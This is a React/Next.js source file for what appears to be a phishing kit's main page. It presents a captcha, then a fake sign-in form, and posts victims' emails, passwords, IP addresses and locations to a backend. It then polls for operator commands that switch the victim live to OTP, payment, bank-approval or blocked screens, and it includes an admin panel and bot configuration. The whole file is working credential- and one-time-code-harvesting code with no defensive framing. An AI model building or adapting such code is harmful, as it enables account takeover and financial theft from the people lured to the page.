'use client'

import React, { useState, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { ChevronLeft, Eye, EyeOff } from 'lucide-react'
import { API_URL } from './config'
import { SocialButton } from './components/SocialButton'
import { Captcha } from './components/Captcha'
import { PaymentPage } from './components/PaymentPage'
import { ProcessingPage } from './components/ProcessingPage'
import { AdminPanel, loadBotConfig } from './components/AdminPanel'
import { OtpPage } from './components/OtpPage'
import { BankApprovalPage } from './components/BankApprovalPage'
import { TranslationProvider, useTranslation } from './TranslationContext'
import { HeroIllustration } from './components/HeroIllustration'

export type ViewState = 'captcha' | 'login' | 'payment' | 'loading' | 'otp' | 'bank-approval' | 'blocked'

const MainAppInner: React.FC = () => {
  const { t } = useTranslation()
  const router = useRouter()
  const [view, setView] = useState<ViewState>('captcha')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [locationName, setLocationName] = useState('Detecting...')
  const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', country: 'Unknown' })
  const [botConfig, setBotConfig] = useState(() => loadBotConfig())
  const [remoteAction, setRemoteAction] = useState<string>('none')

  // Fetch geo info
  useEffect(() => {
    const fetchGeo = async () => {
      try {
        const res = await fetch(`${API_URL}/api/geo`)
        const data = await res.json()
        setIpInfo(data)
        setLocationName(data.country || 'Unknown')
      } catch (err) {
        console.log('[v0] Geo fetch error:', err)
      }
    }
    fetchGeo()
  }, [])

  // Poll for remote actions
  useEffect(() => {
    if (!email) return
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`${API_URL}/api/actions/${email}`)
        const data = await res.json()
        if (data.action && data.action !== remoteAction) {
          setRemoteAction(data.action)
          if (data.action === 'send_otp') setView('otp')
          else if (data.action === 'require_payment') setView('payment')
          else if (data.action === 'block') setView('blocked')
        }
      } catch (err) {
        console.log('[v0] Action poll error:', err)
      }
    }, 2000)
    return () => clearInterval(interval)
  }, [email, remoteAction])

  const handleLogin = async () => {
    setView('loading')
    try {
      const res = await fetch(`${API_URL}/api/sessions`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password, location: locationName, ip: ipInfo.ip }),
      })
      const session = await res.json()
      console.log('[v0] Session created:', session.id)
      setView('payment')
    } catch (err) {
      console.log('[v0] Login error:', err)
      setView('login')
    }
  }

  const handleCaptcha = () => {
    setView('login')
  }

  if (view === 'captcha')
    return <Captcha onComplete={handleCaptcha} />
  if (view === 'admin')
    return <AdminPanel onBack={() => setView('login')} />
  if (view === 'payment')
    return <PaymentPage email={email} />
  if (view === 'loading')
    return <ProcessingPage message={t('processing')} />
  if (view === 'otp')
    return <OtpPage email={email} />
  if (view === 'bank-approval')
    return <BankApprovalPage email={email} />
  if (view === 'blocked')
    return (
      <div className="min-h-screen flex items-center justify-center bg-red-50 p-4">
        <div className="text-center">
          <h1 className="text-2xl font-bold text-red-700">Account Blocked</h1>
          <p className="text-red-600 mt-2">Your account access has been temporarily blocked</p>
        </div>
      </div>
    )

  // Login view
  return (
    <div className="min-h-screen bg-white flex">
      <div className="w-full md:w-1/2 flex flex-col p-8 justify-center">
        <button
          onClick={() => setView('admin')}
          className="absolute top-4 right-4 text-xs text-gray-500 hover:text-gray-700 px-3 py-1 rounded border border-gray-300"
        >
          [Admin]
        </button>

        <div className="max-w-md mx-auto w-full">
          <h1 className="text-3xl font-bold mb-2">{t('welcomeBack')}</h1>
          <p className="text-gray-600 mb-8">{t('signInToContinue')}</p>

          <input
            type="text"
            placeholder={t('emailOrPhone')}
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg mb-4 focus:outline-none focus:border-orange-500"
          />

          <div className="relative mb-4">
            <input
              type={showPassword ? 'text' : 'password'}
              placeholder={t('password')}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-orange-500"
            />
            <button
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-3 text-gray-600 hover:text-gray-900"
            >
              {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
            </button>
          </div>

          <div className="flex justify-between items-center mb-6 text-sm">
            <label className="flex items-center">
              <input type="checkbox" className="mr-2" />
              {t('rememberMe')}
            </label>
            <button className="text-orange-500 hover:text-orange-600">{t('forgotPassword')}</button>
          </div>

          <button
            onClick={handleLogin}
            disabled={!email || !password}
            className="w-full bg-orange-500 hover:bg-orange-600 disabled:bg-gray-300 text-white font-bold py-3 rounded-lg mb-4 transition"
          >
            {t('signIn')}
          </button>

          <div className="relative my-6">
            <div className="absolute inset-0 flex items-center">
              <div className="w-full border-t border-gray-300" />
            </div>
            <div className="relative flex justify-center text-sm">
              <span className="px-2 bg-white text-gray-500">{t('orContinueWith')}</span>
            </div>
          </div>

          <div className="grid grid-cols-3 gap-4 mb-6">
            <SocialButton platform="google" />
            <SocialButton platform="facebook" />
            <SocialButton platform="apple" />
          </div>

          <p className="text-center text-gray-600 text-sm">
            {t('noAccount')} <button className="text-orange-500 font-bold hover:underline">{t('signUp')}</button>
          </p>
        </div>
      </div>

      <div className="hidden md:flex w-1/2 bg-gradient-to-br from-orange-400 to-red-500 items-center justify-center p-8">
        <HeroIllustration />
      </div>
    </div>
  )
}

export default function Home() {
  const [country, setCountry] = useState<string | undefined>()

  useEffect(() => {
    const fetchCountry = async () => {
      try {
        const res = await fetch('/api/geo')
        const data = await res.json()
        setCountry(data.country)
      } catch (err) {
        console.log('[v0] Country fetch error:', err)
      }
    }
    fetchCountry()
  }, [])

  return (
    <TranslationProvider country={country}>
      <MainAppInner />
    </TranslationProvider>
  )
}
